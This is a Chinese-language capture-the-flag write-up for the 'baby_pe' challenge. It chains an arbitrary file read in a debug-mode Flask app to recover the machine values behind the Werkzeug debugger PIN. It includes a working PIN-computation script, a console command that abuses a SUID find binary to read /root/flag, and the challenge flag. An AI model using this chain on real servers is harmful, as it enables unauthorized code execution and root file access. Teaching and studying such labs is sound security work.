# baby_pe

## 题目简述

Flask 应用以 debug 模式运行，并提供任意文件读取 `/fileread`。可以读取 Werkzeug 调试器 PIN 的组成信息，进入 `/console` 获得应用用户 `app` 的 Python 代码执行；Dockerfile 又把 `/usr/bin/find` 设置为 SUID root，因此可借它读取真正位于 `/root/flag` 的 flag。

## 解题过程

应用源码只有一个文件读取点：

```python
@app.route('/fileread')
def read_file():
    filename = request.args.get('filename')
    return open(filename).read()

app.run(debug=True, host="0.0.0.0", port=8000)
```

先访问 `/fileread?filename=/flag`，只能得到提示；Dockerfile 表明真实文件和权限边界是：

```dockerfile
RUN chmod +s $(which find)
RUN useradd -ms /bin/bash app
RUN echo "flag要root用户才可以看到,听说flask可以算pin" > /flag
RUN echo 0xGame{You_Are_The_Privilege_Escalation_Master!} > /root/flag
USER app
```

Werkzeug 2.3.6 计算 PIN 所需的稳定公开项为：

```text
username = app
modname = flask.app
appname = Flask
modfile = /usr/local/lib/python3.9/site-packages/flask/app.py
```

私有项必须从当前实例读取，不能照抄旧截图：

- `/sys/class/net/eth0/address`：去掉冒号后按十六进制转为十进制，即 `uuid.getnode()`；
- 优先读取 `/etc/machine-id`，为空或不存在时读取 `/proc/sys/kernel/random/boot_id`；
- 再拼接 `/proc/self/cgroup` 第一行最后一个 `/` 后的内容。

把现场值填入下列脚本：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "app",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.9/site-packages/flask/app.py",
]

mac_text = "02:42:ac:11:00:02"          # 替换为当前实例读取值
machine_id = "CURRENT_MACHINE_ID"        # machine-id 或 boot-id
cgroup_suffix = "CURRENT_CGROUP_SUFFIX" # 为空时填空字符串

private_bits = [
    str(int(mac_text.replace(":", ""), 16)),
    machine_id + cgroup_suffix,
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if bit:
        h.update(bit.encode())

h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
number = f"{int(h.hexdigest(), 16):09d}"[:9]

for size in (5, 4, 3):
    if len(number) % size == 0:
        pin = "-".join(number[i:i + size] for i in range(0, len(number), size))
        break

print(cookie_name)
print(pin)
```

例如官方 WP 截图对应的 MAC 十进制值 `2485378416642` 和 machine ID `c81cb9a4-faea-4e68-aace-a87a810cb531` 会算出 `488-615-356`；这只是该实例的示例。

访问 `/console`，输入当前实例算出的 PIN。在调试控制台执行：

```python
__import__("os").popen("/usr/bin/find /root/flag -exec cat {} \\;").read()
```

SUID `find` 以有效 root 权限遍历 `/root/flag`，其 `-exec` 启动的 `cat` 继承权限，输出：

```text
0xGame{You_Are_The_Privilege_Escalation_Master!}
```

## 方法总结

完整链路是“任意文件读取 → 收集 Werkzeug PIN 因子 → debug console 代码执行 → SUID find 提权读文件”。PIN 与容器实例绑定，WP 应保留计算规则而不是固定 PIN；最终目标也应以 Dockerfile 为准区分提示文件 `/flag` 和真正的 `/root/flag`。
